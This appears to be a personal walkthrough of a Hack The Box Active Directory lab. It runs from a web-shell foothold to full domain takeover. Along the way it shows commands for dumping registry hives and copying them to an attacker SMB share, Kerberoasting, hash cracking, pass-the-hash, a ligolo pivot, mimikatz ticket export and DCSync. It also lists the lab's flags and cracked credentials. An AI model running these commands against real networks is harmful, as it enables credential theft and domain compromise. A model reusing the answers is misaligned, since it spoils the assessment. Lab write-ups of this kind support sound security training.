---
platform: hackthebox
difficulty: unknown
status: Completed
date: 2026-10-08
tags:
---
# HTB: AD Enumeration & Attacks - Skills Assessment Part I

**Targets:**  


| Host-Name                    | IP-Addresses                                       |
| ---------------------------- | -------------------------------------------------- |
| **ACADEMY-EA-WEB01-SA1**     | `10.129.*.*` (External), `172.16.6.100` (Internal) |
| **DC01**                     | `172.16.6.3`                                       |
| **MS01.INLANEFREIGHT.LOCAL** | `172.16.6.50`                                      |



---

## 01 - Scope
### Assignment:
A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.
### Objectives:
- **Primary Goals:**
  - [x] Submit the contents of the flag.txt file on the administrator Desktop of the web server
`JusT_g3tt1ng_st@rt3d!`
  - [x] Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer
`svc_sql`
  - [x] Crack the account's password. Submit the cleartext value.
`lucky7`
  - [x] Submit the contents of the flag.txt file on the Administrator desktop on MS01
`spn$_r0ast1ng_on_@n_0p3n_f1re`
  - [x] Find cleartext credentials for another domain user. Submit the username as your answer.
`tpetty
  - [x] Submit this user's cleartext password.
`Sup3rS3cur3D0m@inU2eR`
  - [x] What attack can this user perform?
`DCSync
  - [x] Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01
`r3plicat1on_m@st3r!`

---

## 02 - Procedure
1. I first did a scan of the `webserver` to see what we are dealing with.
```bash
nmap -p- --min-rate 500 --max-retries 1 -v -n 10.129.240.253 > webserver
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008081951.png)

```bash
nmap -p 80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV 10.129.240.253 | tee dwebserver
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008082130.png)

2. As we can see from the output above, there is no `RDP` or `SSH`  open. But we should be able to work with `SMB`, `RPC` and `WMI/WinRM`. So lets continue with connecting to the webshell and enumerating the `Host`.
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008082625.png)
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008082722.png)

3. Since we are already the `NT Authority` user, the goal now is to gain the credentials of an user, preferably a domain-user. (We would also be able to perform more invasive actions from here, such as creating a local Admin and enabling RDP. But this wouldn't be very wise in most real engagements. After all, we're on a web server here that was probably meant to simulate a web server accessible via the Internet...)

4. I therefore checked if we are allowed to dump the `sam-db`, which was successful:
```powershell
reg.exe save hklm\sam C:\Temp\sam.save
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008090231.png)

5. Being able to dump the `sam-db` and probably also the `security-hive` will allow us to gain the password-hashes of the hosts stored user credentials. However, in order to use these on our attack box, we need a way to export them. Two good options in this scenario are via SMB, or exporting them as a base64 string, which I did:
```powershell
[Convert]::ToBase64String((Get-Content -Path 'C:\sam.save' -Encoding Byte))
```
I than copy pasted it to my machine and converted it back to it's initial format:
```bash
echo -n 'STRING-VALUE' | base64 -d > sam.save
```
I than repeated this process for the `system-hive` and `security-hive`.
Turned out, that this wasn't a good idea, since the load of the `system-hive` caused the webshell to crash.

6. So I started a smb-server on my attackbox and copied the files to it:
Attackbox:
```bash
sudo impacket-smbserver share /tmp/smbshare -smb2support -username admin -password N0Base64Here!
```
Webserver:
```powershell
net use \\10.10.15.206\share /user:admin N0Base64Here!
```

```powershell
cmd /c copy C:\system.save \\10.10.15.206\share\system.save
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008093833.png)

7. Afterwards I dumped the hashes, which contained the `Local Admin` and `Domain Admin` hash:
```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008100105.png)

8. I tried to bruteforce the `local Admin` hash, but without success:
```bash
hashcat -m 1000 'aad3b435b51404eeaad3b435b51404ee' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008100848.png)
I also started a bruteforcing-session for the `domain admin` and continued, since this can take a while:
```bash
hashcat -m 2100 '$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008112813.png)

9. I therefore continued with `pass the hash` of the `local admin`. Which provided me with a really slow `Powershell` and allowed me to grab the flag from the Administrators `Desktop` (Which would also have worked with the System-Shell):
```bash
evil-winrm -i 10.129.240.253 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008102228.png)

10. I then copied `Rubeus.exe` to the target and tried enumerating the domain. This didn't work out, since the local admin doesn't send the request in a domain-context and thus isn't allowed to make LDAP-reqeust.
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008103733.png)

11. But we can easily get around this by running Rubeus in the “System Shell.” This causes `Rubeus.exe` to run in the context of the machine account, which is part of the domain. 
```powershell
.\Rubeus.exe kerberoast /preview
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008112611.png)

12. I retrieved the `TGS` and then proceeded with cracking the hash on my attackbox:
```bash
hashcat -m 13100 msql /usr/share/wordlists/rockyou.txt
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008113059.png)

13. Now it is worth trying to pivot further into the infrastructure. I therefore setup a `ligolo`  between my `attackbox` and the `webserver`
Attackbox:
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

```bash
sudo ip route add 172.16.6.0/24 dev ligolo
```

Webserver:

```powershell
cmd /c copy \\10.10.15.206\share\ligolo-ng_agent_0.9.1_windows_amd64.exe
```

```powershell
.\ligolo-ng_agent_0.9.1_windows_amd64.exe -connect 10.10.15.206:11601 -ignore-cert
```

14. And like that, we are no able to scan the `internal Subnet` . The `webserver` couldn't resolve the name of the sql-server `SQL01.inlanefreight.local` , but provided us the IP-Address of the DNS-Server `172.16.6.3`, which is also valuable. 
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008114711.png)

15. To get a bigger picture I continued with a `nmap ping-sweep` which additionally discovered `172.16.6.50` as host, which will most likely be our missing puzzle-piece the `sql-server`:
```bash
sudo nmap -sn -v -PS80,445,3389,22 172.16.6.0/24
```
I then continuously lost the `ligolo-tunnel` to the webserver, because its VRAM was exhausted...
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008120326.png)
When I tried to find and stop the guilty process, I completely lost access and had to restart the machine:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008121026.png)

16. After restarting and setting up `ligolo` again I continued enumerating `172.16.6.50` , which turned out to be a the server `MS01.INLANEFREIGHT.LOCAL` .
```bash
nmap -p- --min-rate 50 --max-retries 1 -v -n 172.16.6.50 > unknown
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008135008.png)

```bash
nmap -p 135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49671,49672 -sC -sV 172.16.6.50 | tee dunknown
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008135328.png)

17. Even tho this isn't the server I was looking for, `RDP` is open, which makes further enumerating much more comfortable. And there is also a flag located on the Administrators Desktop, which is part of the "assessment" :
```bash
xfreerdp /v:172.16.6.50 /u:svc_sql /p:'lucky7' /dynamic-resolution /cert:ignore
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008140329.png)

18. Before I continue with looking for the `cleartext credentials`, I wanted to make sure, that I have an overview of all devices in the subnet `172.16.6.0/24`. Which also revealed and confirmed the DC-Server `DC01` :
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008140846.png)

19. In order to find any potential `cleartext passwords` I run `snaffler.exe`, which dind't find anything usefull:
```cmd
Snaffler.exe -s -m "C:\temp\loot" -o "C:\temp\snaffler.log"
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008142838.png)

20. Since HTB is reffering to `cleartext credentials` I then queried the AD for all  `user description` values with `PowerView`:
```powershell
Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description -ne $null}
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008143559.png)

21. `Rubeus` revealed earlier, that we have access to`\\DC01.INLANEFREIGHT.LOCAL\SYSVOL`, which I manually checked. Unfortunately there where no scripts, but an object of the `default domain policy` revealed interesting information about the password policy:
- `ClearTextPassword = 0` = no reversible encryption
- `MinimumPasswordLength = 1` = no min. password length
- `PasswordComplexity = 0` = no uppercase or special characters required
- `LockoutBadCount = 0` = no Account lockout, meaning "infinite" bruteforce attempts
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008144928.png)

21. Anyways, this won't help us out with finding the `cleartext credentials`...in order to get a better overview of the AD-infrastructure I mapped it with `bloodhound` :
```bash
sudo bloodhound-python -u 'svc_sql' -p 'lucky7' -ns 172.16.6.3 -d inlanefreight.local -c all
```
I checked `Principals with DCSync privileges`...
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008160018.png)
and our user `svc_sql`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008160401.png)


22. But to be honest, I didn't really know how to gain value from it. I therefor decided to stick to tools which I am more familiar with for now. So I enumerated `DC01` with nmap:
```bash
nmap -p- --min-rate 50 --max-retries 1 -v -n 172.16.6.3 > dc
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008161948.png)

```bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49678,49679,49684,49696,49719 -sC -sV 172.16.6.3 > ddc
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008162136.png)

23. I then proceeded and tried to connect via `WinRM` to the `DC01` as user `svc_sql`. but he didn't had sufficient privileges:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008162809.png)

24. I went back to the server `MS01` and run `mimikatz`, with which I dumped the `tgt` of the user `tpetty`:
```powershell
mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit > ticketharvest.txt
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008163859.png)

25. And tried to login to the dc with her ticket, without success:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008170242.png)

26. I also dumped her `password hash` and tried to bruteforce it:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008171725.png)

```bash
hashcat -m 1000 'fd37b6fec5704cadabb319cebf9e3a3a' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008171818.png)

27. At this point, I checked a walkthrough and learnt, that `mimikatz` per default only dumps passwords from the `lsass.exe` process and e.g.  `netexec` dumps the `sam-db and security-hive` (like I did manually with the webserver in the beginning). 
	So I dumped the `Security-Hive` with `Netexec` and retrieved the `cleartext password`:
```bash
netexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008173553.png)

28. I then checked, if she can perform `DC-Sync` , turns out she can:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008174021.png)

29. Thus I performed a `DC-Sync dump`  with `impacket-secretsdump`:
```bash
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc-user Administrator INLANEFREIGHT/tpetty@172.16.6.3
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008174927.png)

30. And then tried to bruetforce the password without success:
```bash
hashcat -m 1000 domadm /usr/share/wordlists/rockyou.txt
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008175408.png)

31. So I tried to execute `PTH` over `WinRM` and luckily it worked!! And like that I was able to finally retrieve the `flag.txt`:
```bash
evil-winrm -i 172.16.6.3 -u Administrator@inlanefreight.local -H 27dedb1dab4d8545c6e1c66fba077da0
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261008180048.png)

## 03 - Lesson Learned 
1. By default, `Mimikatz` extracts the credentials of active sessions (from lsass.exe), while `netexec` extracts locally stored  SAM hashes and LSA secrets from registry hives.
2. It's important to stay within the resources of the pivot/target server so that it doesn't crash (of course, in a real-world scenario, a web server would probably have a little more than 2 GB of RAM).
